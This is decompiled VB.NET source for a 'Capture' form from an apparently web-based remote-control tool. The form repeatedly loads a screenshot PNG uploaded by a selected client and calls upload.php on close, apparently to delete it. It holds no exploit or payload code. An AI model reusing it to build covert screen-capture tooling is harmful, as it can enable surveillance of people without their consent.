Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class WebOrScreenCapture
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.WebOrScreenCapture_Load)
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.WebOrScreenCapture_FormClosing)
            Dim list As List(Of WeakReference) = WebOrScreenCapture.__ENCList
            SyncLock list
                WebOrScreenCapture.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.SendCommand = New WebClient
            Me.web = New WebClient
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.Close
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.PictureBox1.Load((MyProject.Forms.Client.HostName.ToString & "/Upload/" & MyProject.Forms.Client.WitchViewSW.ToString & ".png"))
                Me.Timer1.Stop
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Process.Start((MyProject.Forms.Client.HostName.ToString & "/Upload/" & MyProject.Forms.Client.WitchViewSW.ToString & ".png"))
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(WebOrScreenCapture))
            Me.PictureBox1 = New PictureBox
            Me.Button2 = New Button
            Me.Label1 = New Label
            Me.Timer1 = New Timer(Me.components)
            Me.Button1 = New Button
            Me.Panel1 = New Panel
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.Panel1.SuspendLayout
            Me.SuspendLayout
            Me.PictureBox1.Dock = DockStyle.Fill
            Dim point As New Point(0, 2)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            Dim size As New Size(&H2E5, &H1DE)
            Me.PictureBox1.Size = size
            Me.PictureBox1.TabIndex = 5
            Me.PictureBox1.TabStop = False
            Me.Button2.Dock = DockStyle.Right
            point = New Point(&H256, 0)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&H8F, &H26)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 3
            Me.Button2.Text = "Refresh"
            Me.Button2.UseVisualStyleBackColor = True
            Me.Label1.AutoSize = True
            Me.Label1.BackColor = Color.Transparent
            Me.Label1.Dock = DockStyle.Top
            Me.Label1.Font = New Font("Microsoft Sans Serif", 1.5!, FontStyle.Regular, GraphicsUnit.Point, 0)
            point = New Point(0, 0)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(3, 2)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 6
            Me.Label1.Text = "1"
            Me.Timer1.Enabled = True
            Me.Timer1.Interval = &H1388
            Me.Button1.Dock = DockStyle.Fill
            point = New Point(0, 0)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H256, &H26)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 1
            Me.Button1.Text = "Close"
            Me.Button1.UseVisualStyleBackColor = True
            Me.Panel1.Controls.Add(Me.Button1)
            Me.Panel1.Controls.Add(Me.Button2)
            Me.Panel1.Dock = DockStyle.Bottom
            point = New Point(0, 480)
            Me.Panel1.Location = point
            Me.Panel1.Name = "Panel1"
            size = New Size(&H2E5, &H26)
            Me.Panel1.Size = size
            Me.Panel1.TabIndex = 7
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H2E5, &H206)
            Me.ClientSize = size
            Me.Controls.Add(Me.PictureBox1)
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.Panel1)
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "WebOrScreenCapture"
            Me.Text = "Capture"
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.Panel1.ResumeLayout(False)
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub PictureBox1_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.PictureBox1.Load((MyProject.Forms.Client.HostName.ToString & "/Upload/" & MyProject.Forms.Client.WitchViewSW.ToString & ".png"))
                Me.Timer1.Stop
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Process.Start((MyProject.Forms.Client.HostName.ToString & "/Upload/" & MyProject.Forms.Client.WitchViewSW.ToString & ".png"))
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub WebOrScreenCapture_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            Try 
                Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/upload.php?D=true"))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub WebOrScreenCapture_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = WithEventsValue
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = WithEventsValue
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Panel1 As Panel
            <DebuggerNonUserCode> _
            Get
                Return Me._Panel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Panel)
                Me._Panel1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            <DebuggerNonUserCode> _
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As PictureBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PictureBox1_Click)
                If (Not Me._PictureBox1 Is Nothing) Then
                    RemoveHandler Me._PictureBox1.Click, handler
                End If
                Me._PictureBox1 = WithEventsValue
                If (Not Me._PictureBox1 Is Nothing) Then
                    AddHandler Me._PictureBox1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Timer1 As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._Timer1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me._Timer1 Is Nothing) Then
                    RemoveHandler Me._Timer1.Tick, handler
                End If
                Me._Timer1 = WithEventsValue
                If (Not Me._Timer1 Is Nothing) Then
                    AddHandler Me._Timer1.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Panel1")> _
        Private _Panel1 As Panel
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("Timer1")> _
        Private _Timer1 As Timer
        Private components As IContainer
        Private SendCommand As WebClient
        Private web As WebClient
    End Class
End Namespace

